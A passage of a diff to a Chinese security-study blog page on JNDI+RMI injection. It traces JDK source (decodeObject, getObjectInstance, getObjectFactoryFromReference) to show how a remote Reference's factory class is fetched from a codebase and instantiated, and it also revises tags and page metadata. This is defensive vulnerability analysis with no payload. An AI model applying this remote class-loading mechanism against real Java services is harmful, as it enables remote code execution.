 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">var3</span> <span class="operator">=</span> var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">        <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="built_in">this</span>, <span class="built_in">this</span>.environment);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var5;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">        <span class="type">NamingException</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>();</span><br><span class="line">        var4.setRootCause(var7);</span><br><span class="line">        <span class="keyword">throw</span> var4;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-首先检查var1，也就是我们传入的查找到的远程对象是否是RemoteReference格式的数据如果是，则通过((RemoteReference)var1).getReference()获取远程引用对象，不是，就直接调用var1。
-
-接着进入getObjectInstance
-
+<p>首先检查var1，也就是我们传入的查找到的远程对象是否是RemoteReference格式的数据如果是，则通过((RemoteReference)var1).getReference()获取远程引用对象，不是，就直接调用var1。</p>
+<p>接着进入getObjectInstance</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">    <span class="title function_">getObjectInstance</span><span class="params">(Object refInfo, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                      Hashtable&lt;?,?&gt; environment)</span></span><br><span class="line">    <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    ObjectFactory factory;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use builder if installed</span></span><br><span class="line">    <span class="type">ObjectFactoryBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> getObjectFactoryBuilder();</span><br><span class="line">    <span class="keyword">if</span> (builder != <span class="literal">null</span>) &#123;<span class="comment">//远程调用，故为null</span></span><br><span class="line">        <span class="comment">// builder must return non-null factory</span></span><br><span class="line">        factory = builder.createObjectFactory(refInfo, environment);</span><br><span class="line">        <span class="keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,</span><br><span class="line">            environment);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use reference if possible</span></span><br><span class="line">    <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">        ref = (Reference) refInfo;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">        ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object answer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">        <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line">            factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">            <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                 environment);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// No factory found, so return original refInfo.</span></span><br><span class="line">            <span class="comment">// Will reach this point if factory class is not in</span></span><br><span class="line">            <span class="comment">// class path and reference does not contain a URL for it</span></span><br><span class="line">            <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// if reference has no factory, check for addresses</span></span><br><span class="line">            <span class="comment">// containing URLs</span></span><br><span class="line"></span><br><span class="line">            answer = processURLAddrs(ref, name, nameCtx, environment);</span><br><span class="line">            <span class="keyword">if</span> (answer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> answer;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// try using any specified factories</span></span><br><span class="line">    answer =</span><br><span class="line">        createObjectFromFactories(refInfo, name, nameCtx, environment);</span><br><span class="line">    <span class="keyword">return</span> (answer != <span class="literal">null</span>) ? answer : refInfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-builder == null，refInfo检查格式，如果是Reference就尝试获取工厂类名，如果ref存在，就用类名创建工厂
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/74026dfc-image.png)
-
-返回的结果
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/1abeeacd-image.png)
-
+<p>builder &#x3D;&#x3D; null，refInfo检查格式，如果是Reference就尝试获取工厂类名，如果ref存在，就用类名创建工厂</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/74026dfc-image.png" alt="image.png"></p>
+<p>返回的结果</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/1abeeacd-image.png" alt="image.png"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> ObjectFactory <span class="title function_">getObjectFactoryFromReference</span><span class="params">(</span></span><br><span class="line"><span class="params">    Reference ref, String factoryName)</span></span><br><span class="line">    <span class="keyword">throws</span> IllegalAccessException,</span><br><span class="line">    InstantiationException,</span><br><span class="line">    MalformedURLException &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clas</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Try to use current class loader</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">         clas = helper.loadClass(factoryName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// ignore and continue</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// All other exceptions are passed up.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Not in class path; try to use codebase</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">            (codebase = ref.getFactoryClassLocation()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-最后调用newInstance()方法来执行实例
-
-​
-
-[board]
-
-参考链接：
-
-[https://blog.csdn.net/Gherbirthday0916/article/details/136459856](https://blog.csdn.net/Gherbirthday0916/article/details/136459856)
-
-https://www.cnblogs.com/LittleHann/p/17768907.html
-
----
-
-来源: https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/dw27qsyn5d8gu1nq
-语雀文档ID: 187497177
-
+<p>最后调用newInstance()方法来执行实例</p>
+<p>​</p>
+<p>[board]</p>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Gherbirthday0916/article/details/136459856">https://blog.csdn.net/Gherbirthday0916/article/details/136459856</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LittleHann/p/17768907.html">https://www.cnblogs.com/LittleHann/p/17768907.html</a></p>
+<hr>
+<p>来源: <a target="_blank" rel="noopener" href="https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/dw27qsyn5d8gu1nq">https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/dw27qsyn5d8gu1nq</a><br>语雀文档ID: 187497177</p>
 
     </div>
 
@@ -401,9 +350,9 @@ https://www.cnblogs.com/LittleHann/p/17768907.html
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
-              <a href="/tags/CTF/" rel="tag"># CTF</a>
-              <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"># 学习笔记</a>
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/JNDI/" rel="tag"># JNDI</a>
+              <a href="/tags/RMI/" rel="tag"># RMI</a>
           </div>
 
         
@@ -416,8 +365,8 @@ https://www.cnblogs.com/LittleHann/p/17768907.html
       <i class="fa fa-chevron-left"></i> Weblogic(CVE-2017-10271)
     </a></div>
       <div class="post-nav-item">
-    <a href="/2026/09/16/15-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="java反序列化">
-      java反序列化 <i class="fa fa-chevron-right"></i>
+    <a href="/2026/09/16/17-redis/" rel="next" title="redis">
+      redis <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -477,6 +426,7 @@ https://www.cnblogs.com/LittleHann/p/17768907.html
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI-RMI"><span class="nav-number">1.</span> <span class="nav-text">JNDI+RMI</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFJNDI"><span class="nav-number">2.</span> <span class="nav-text">什么是JNDI</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI%E8%A7%A3%E5%86%B3%E7%9A%84%E9%97%AE%E9%A2%98-%E7%89%B9%E6%80%A7"><span class="nav-number">3.</span> <span class="nav-text">JNDI解决的问题&#x2F;特性</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI-RMI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">JNDI+RMI注入原理分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%A7%A6%E5%8F%91%E9%93%BE"><span class="nav-number">4.2.</span> <span class="nav-text">漏洞代码触发链</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -492,7 +442,7 @@ https://www.cnblogs.com/LittleHann/p/17768907.html
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">72</span>
+          <span class="site-state-item-count">64</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -505,7 +455,7 @@ https://www.cnblogs.com/LittleHann/p/17768907.html
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">94</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
